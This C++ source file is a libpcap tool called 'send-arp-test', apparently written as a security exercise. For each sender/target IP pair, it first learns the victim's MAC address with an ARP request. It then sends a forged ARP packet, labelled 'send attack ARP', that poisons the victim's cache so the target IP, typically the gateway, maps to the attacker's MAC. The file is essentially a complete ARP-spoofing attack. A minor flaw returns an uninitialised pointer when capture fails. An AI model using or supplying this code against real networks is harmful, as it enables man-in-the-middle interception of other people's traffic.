#include "pch.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getMacAddress(const char* iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);

    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip getIpAddress(const char* iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
}


ArpHdr* sendArp(pcap_t* pcap, Mac eth_smac, Mac eth_dmac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac){
    EthArpPacket packet;

    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = arp_dmac;
    packet.arp_.tip_ = htonl(dip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
    while(true){
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int res = pcap_next_ex(pcap, &header, &reply_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        EthHdr* ethHdr = (struct EthHdr*)reply_packet;
        if(ethHdr->type() != EthHdr::Arp) continue;

        ArpHdr* arpHdr = (struct ArpHdr*)(reply_packet + sizeof(struct EthHdr));
        if(arpHdr->sip() == Ip(dip) && arpHdr->op() == ArpHdr::Reply){
            return arpHdr;
        }
    }
    ArpHdr* arpHdr;
    return arpHdr;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
    // get my MAC, IP address
    char* dev = argv[1];

    Mac my_mac = getMacAddress(dev);
    Ip my_ip = getIpAddress(dev);

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }


    for(int i=2;i<argc;i+=2){
        Ip sip = Ip(argv[i]);
        Ip tip = Ip(argv[i+1]);

        // get victim's MAC address
        ArpHdr* arpHdr = sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, sip, my_mac, Mac::nullMac());
        Mac smac = arpHdr->smac();

        // send attack ARP
        sendArp(pcap, my_mac, smac, tip, sip, my_mac, smac);
    }
    pcap_close(pcap);

    return 0;
}
